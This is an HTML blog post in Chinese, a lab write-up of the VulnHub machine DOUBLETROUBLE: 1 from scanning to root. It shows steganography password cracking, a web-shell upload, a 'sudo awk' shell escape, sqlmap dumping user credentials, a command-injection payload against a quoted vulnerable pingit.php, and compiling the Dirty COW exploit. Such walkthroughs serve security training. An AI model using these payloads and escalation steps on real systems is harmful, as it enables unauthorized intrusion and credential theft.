@@ -1,0 +1,329 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>VulnHub靶场之DOUBLETROUBLE: 1 | Microthink-yjn140</title>
+
+<link rel="shortcut icon" href="https://yjn140.site/favicon.ico?v=1690542654805">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://yjn140.site/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.1/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script> 
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Microthink-yjn140
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1690542654805"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    VulnHub靶场之DOUBLETROUBLE: 1
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-07-13 ·
+                    </time>
+                    
+                        <a href="https://yjn140.site/AVMJKGPZI/" class="post-tags">
+                            # vulnhub
+                        </a>
+                    
+                        <a href="https://yjn140.site/8Eo75T6ej/" class="post-tags">
+                            # CTF题
+                        </a>
+                    
+                        <a href="https://yjn140.site/BFKweRoOM/" class="post-tags">
+                            # 技术
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="vulnhub靶场doubletrouble">vulnhub靶场doubletrouble</h1>
+<p>首先是下载镜像，然后用vmware打开，记得关闭usb，然后网络配置建议设置成桥接模式，然后需要指定桥接的网卡。需要用同样的方法，修改网卡信息，这样才能分配到ip</p>
+<p>使用nmap进行扫描</p>
+<pre><code class="language-bash">sudo nmap -sP 192.168.[num1].1/24  
+</code></pre>
+<p>/24表示那个网段1-254都扫描</p>
+<p>然后对靶机的ip进行端口扫描</p>
+<pre><code class="language-bash">sudo nmap -P 192.168.[num1].[num2]
+</code></pre>
+<p>-sC 表示使用nmap脚本探测 -sV探测服务信息</p>
+<p>-p-表示扫描全端口</p>
+<p>扫出来开放了22和80端口</p>
+<p>访问80端口可以看到一个网页</p>
+<p>简单试一下admin这样的密码</p>
+<p>找一下网上看看有没有默认密码</p>
+<p>然后sqlmap试一下有没有注入</p>
+<p>发现没啥用</p>
+<p>然后</p>
+<pre><code class="language-bash">dirsearch -u http://192.168.2.9/
+</code></pre>
+<p>跑一下目录</p>
+<p>其实用gobuster也行，但是自己得有好字典，不然还不如dirsearch</p>
+<p>然后发现有若干cms常规路径</p>
+<p>比较令人好奇的是secret目录</p>
+<p>访问发现一张图</p>
+<p>用steghide检测一下有没有隐写</p>
+<pre><code class="language-bash">steghide --info doubletrouble.jpg
+</code></pre>
+<p>发现有隐写后，用stegseek加上字典跑一下</p>
+<p>mac上编译stegseek有点问题，我这用kali演示一下</p>
+<pre><code class="language-bash">gzip -d /usr/share/wordlists/rockyou.txt.gz
+</code></pre>
+<pre><code class="language-bash">stegseek dooubletrouble.jpg rockyou.txt 
+</code></pre>
+<p>发现账号和密码</p>
+<p>otisrush@localhost.com<br>
+otis666</p>
+<p>于是登陆看看</p>
+<p>发现个人资料的位置有一个上传文件的地方</p>
+<p>传一个冰蝎的shell看一下</p>
+<p>找到我们刚才跑目录跑出来的uploads路径，看一下有没有新文件</p>
+<p>发现我们上传的文件被重命名了</p>
+<p>用冰蝎连接一下</p>
+<p>可以看看基本的文件路径</p>
+<p>然后虚拟终端连接一下，看一看文件</p>
+<p>执行 sudo -l看一下权限信息</p>
+<p>发现有个awk不用输密码</p>
+<p>然后找了下awk的用法</p>
+<pre><code class="language-bash">sudo awk 'BEGIN {system(&quot;/bin/sh&quot;)}'
+</code></pre>
+<p>执行这个就能获得root权限</p>
+<p>然后进/root目录发现有一个系统镜像</p>
+<p>然后也没有别的线索了，就只能下载下来，在运行这个镜像</p>
+<p>刚好符合题目doubletrouble</p>
+<pre><code class="language-bash">python3 -m http.server 1234
+</code></pre>
+<p>然后同样的方法发现第二台靶机的ip和端口</p>
+<p>发现开放了22端口和80端口</p>
+<p>访问网页看看</p>
+<p>发现是一个表单</p>
+<p>打算试试sqlmap</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://192.168.2.20/&quot;
+
+sqlmap -u &quot;http://192.168.2.20/&quot; -forms
+
+sqlmap -u &quot;http://192.168.2.20/&quot; -forms -dbs
+
+sqlmap -u &quot;http://192.168.2.20/&quot; -forms -D doubletrouble --tables
+
+sqlmap -u &quot;http://192.168.2.20/&quot; -forms -D doubletrouble -T users --dump
+</code></pre>
+<p>之后得到两个用户名和密码</p>
+<p>进行ssh尝试登录</p>
+<p>登录进去后，我们首先看到了user.txt</p>
+<p>然后我们简单看一下权限sudo -l</p>
+<p>发现没有sudo</p>
+<p>然后我们看一下网站的路径</p>
+<p>会发现有两个页面</p>
+<p>第二个页面pingit.php其实有命令执行漏洞，这个文件名可以从大字典跑出来，确定是有的。但是呢，他需要POST传两个参数。ip和submit</p>
+<pre><code class="language-php">&lt;?php
+
+print $_POST['ip'];
+if (isset($_POST['submit'])){
+        $target = $_REQUEST[ 'ip' ];
+        echo '&lt;pre&gt;';
+        echo shell_exec( 'ping -c 3 ' . $target );
+        echo '&lt;/pre&gt;';
+    }
+?&gt;
+</code></pre>
+<p>那么为了利用其中的shell_exec函数，需要首先if判断为真，得随便给submit传一个值。但是用hackbar传submit参数有问题，如果直接submit=1是会报错的，那如果写成Submit=1网上有人说可以，但是在这里，大小写不一样，参数就变了。所以我选择用postman。<code>ip=;ls&amp;submit=1</code>即可。既然这个也能用，甚至不需要密码就可以反弹shell了。值得一提的是，www文件夹没有写权限</p>
+<p>那么现在按照正常思路，需要提权</p>
+<p>看一下</p>
+<pre><code class="language-bash">uname -a
+</code></pre>
+<p>然后searchsploit linux 3.2</p>
+<p>发现可以用脏牛</p>
+<p>很多个提示能用的，然后我这边直接说其中一个能用的</p>
+<p>可以访问https://github.com/firefart/dirtycow/blob/master/dirty.c进行复制粘贴</p>
+<p>然后靶机没有git，也不支持wget下载刚才说的这个链接。当然可以用别的方法，比如本地开http服务，或者用端口传文件。最简单的就是用vi编辑器或者nano编辑器，这里vim没装</p>
+<p>然后按照注释</p>
+<pre><code class="language-bash">gcc -pthread dirty.c -o dirty -lcrypt
+</code></pre>
+<p>给生成的文件加一个执行权限</p>
+<pre><code class="language-bash">chmod +x dirty
+</code></pre>
+<p>然后执行他</p>
+<pre><code class="language-bash">./dirty
+</code></pre>
+<p>输入你设置的密码。等一会儿，然后切换用户</p>
+<pre><code class="language-bash">su firefart
+</code></pre>
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://yjn140.site/zJTL0sviV/" class="post-title gt-a-link">
+                    VulnHub靶场之BEELZEBUB: 1
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'INIV7p9Souw8TCNgorzEFDKL-gzGzoHsz',
+		appKey: 'O4UlwuExAsqaVTYDleea1fx6',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: true,
+		placeholder: 'Just Go Go',
+		visitor: false,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">博主本人是来自一所普通学校的大学生。平时喜欢各种科技数码类的新鲜事物，只要有能力，都想学习钻研一下。各大论坛的ID为“遇见你140”或“yjn140”</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/yjn140" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        联系我：<a href="https://qm.qq.com/cgi-bin/qm/qr?k=aqjmaKpHkvEoOentnmEK2E1AfkB4-i85&noverify=0
+">QQ</a> <br><br>
+<a href="https://beian.miit.gov.cn/#/Integrated/index"   target="_blank">赣ICP备2021010019号-1</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://yjn140.site/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
